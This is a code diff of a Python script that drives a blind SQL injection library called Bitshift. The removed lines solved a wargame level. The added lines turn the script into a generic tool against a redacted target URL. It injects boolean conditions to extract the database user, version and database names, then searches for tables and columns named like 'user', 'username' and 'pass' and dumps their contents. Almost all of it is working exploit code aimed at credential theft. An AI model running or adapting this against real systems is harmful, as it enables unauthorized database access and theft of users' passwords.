@@ -4,27 +4,44 @@ import Bitshift
 
 bitshift=Bitshift.Bitshift()
 
-# Set up parameters
-bitshift.url="http://redtiger.dyndns.org/hackit/level4.php?id="
+bitshift.url="http://XXXXXXXXXXXXXXXXXXX/index.php?id=4&uid="
 bitshift.encodemode="urllib_quote"
-bitshift.length=2
-bitshift.cookies={'level4login':'dont_publish_solutions_ARGH'}
-bitshift.debuglevel=1
+bitshift.length=6
+bitshift.debuglevel=0
 bitshift.condition_target="content"
-bitshift.reg_condition='Query returned [1-9]{1,2} rows'
+bitshift.reg_condition='true response regex'
 
-# Getting the length using time based bitshifting
-query="length(keyword)"
-bitshift.condition_target="time_based"
-bitshift.check_time=3
-bitshift.pattern="-1 UNION SELECT 1,2 FROM level4_secret WHERE ( __BITSHIFT(__ %s __)__ )= 1 #" % (query)
+bitshift.pattern="1 AND 1=( __BITSHIFT( __QUERY__ )__ ) "
 
-length=int(bitshift.getvalue())
+print "User : "+bitshift.get_current_user()
+print "Version : "+bitshift.get_version()
+print "Current DB : "+bitshift.get_current_db()
 
-# Getting keyword using classic bitshifting
-query="keyword"
-bitshift.length=length
-bitshift.condition_target="content"
-bitshift.pattern="-1 UNION SELECT 1,2 FROM level4_secret WHERE ( __BITSHIFT(__ %s __)__ )= 1 #" % (query)
+bases = bitshift.get_databases(exclude_bases=['information_schema', 'mysql'])
 
-print bitshift.getvalue()
+print "Bases : "+str(bases)
+
+for base in bases:
+	user_tables = bitshift.get_tables_names_like(base,"user")
+	 
+	print "User_tables : "+str(user_tables)
+	 
+	for user_table in user_tables:
+		username_columns = bitshift.get_column_name_like(schema=base,table=user_table,like="username")
+		pass_columns = bitshift.get_column_name_like(schema=base,table=user_table,like="pass")
+
+		username_pass_columns = list (set(username_columns + pass_columns ))
+		
+		print "Username_Pass columns : "+str(username_pass_columns)
+		
+		print user_table+" Data : "+str( bitshift.get_entries(table=user_table,schema=base,columns=username_pass_columns))
+
+# You can also:
+		
+# bitshift.get_tables_names_like(database)
+
+# bitshift.get_columns_names(schema=databases,table=table)
+
+# More coming soon...
+
+
